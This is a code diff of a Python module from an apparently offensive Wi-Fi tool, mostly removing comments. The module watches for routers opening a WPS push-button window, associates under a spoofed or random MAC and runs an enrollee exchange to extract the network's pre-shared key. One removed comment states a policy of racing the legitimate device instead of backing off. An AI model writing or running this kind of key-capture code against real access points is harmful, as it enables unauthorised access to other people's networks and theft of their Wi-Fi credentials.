@@ -4,10 +4,6 @@ Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
 run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
 the Scanner/Focus arming wires to; detection itself is passive
 (``AccessPoint.wps_pbc_active``).
-
-Overlap policy: we do NOT self-abort on MULTIPLE_PBC_DETECTED — we race to finish
-first (the decision locked in the README). WpsEnrollee surfaces such a refusal as
-PROTO_ERROR, and the caller simply retries on the next window.
 """
 
 from __future__ import annotations
@@ -27,12 +23,7 @@ logger = logging.getLogger(__name__)
 
 
 class PbcWatcher:
-    """Edge-detects PBC walk windows opening across the live AP list.
-
-    ``new_windows(aps)`` returns the APs whose ``wps_pbc_active`` just went
-    False→True since the previous call, so callers act once per window rather
-    than every poll tick. A window that closes and re-opens re-triggers.
-    """
+    """Edge-detects PBC walk windows opening across the live AP list."""
 
     def __init__(self):
         self._active: set = set()
@@ -45,7 +36,7 @@ class PbcWatcher:
 
 
 class WpsPbcCapture(Campaign):
-    button_id = None        # no button — auto-triggered when a PBC window opens
+    button_id = None   # no button — auto-triggered when a PBC window opens
     key = "pbc"
     stoppable = False
 
@@ -57,28 +48,21 @@ class WpsPbcCapture(Campaign):
         self.channel = target.channel
         self.our_mac = our_mac or random_client_mac()
         self.log = log or logger.info
-        self.tx_observer = tx_observer        # optional: record our TX (probe pcap)
-        # Set by _loop for the screen to read once `done` — the captured outcome
-        # (SUCCESS carries SSID + PSK), or the error if the attempt blew up.
+        self.tx_observer = tx_observer
         self.outcome: Optional[AttemptOutcome] = None
         self.error: Optional[Exception] = None
 
     async def _loop(self) -> None:
-        """One PBC enrollment attempt. The screen reads ``outcome`` once ``done``.
-        capture() self-cleans in its own finally, so teardown() is a no-op."""
+        """One PBC enrollment attempt. The screen reads ``outcome`` once ``done``."""
         try:
             self.outcome = await self.capture()
         except Exception as exc:
             self.error = exc
 
     async def capture(self) -> AttemptOutcome:
-        """One PBC enrollment attempt. Returns the WpsEnrollee outcome (SUCCESS
-        carries the SSID + PSK); ``ABORTED`` if a cooperative stop landed."""
+        """One PBC enrollment attempt. Returns the WpsEnrollee outcome."""
         if self.stopped:
             return AttemptOutcome(PinResult.ABORTED, "<PBC>", detail="stopped before start")
-        # Arm active monitor BEFORE building the session: a FIXED_MAC card returns its silicon MAC
-        # (it ACKs only that), so we must associate/inject as whatever was armed, else the chip
-        # never honors the ACKs. A no-op (None) on cards that can't spoof-ACK.
         armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
         if armed:
             self.our_mac = str_to_mac(armed)
@@ -111,10 +95,7 @@ class WpsPbcCapture(Campaign):
                                             ack_resends=4).run()
         finally:
             # Abandoning a (possibly mid-exchange) attempt: tell the AP we're
-            # leaving so it drops our EAP session. Otherwise it keeps retransmitting
-            # the in-flight WSC message to this now-dead MAC and won't service the
-            # next attempt's fresh MAC — the "stuck at Identity" lockout cascade.
-            # Skipped on SUCCESS (the exchange already completed cleanly).
+            # leaving so it drops our EAP session.
             if outcome is None or outcome.result is not PinResult.SUCCESS:
                 try:
                     await self.iface.send_no_wait(
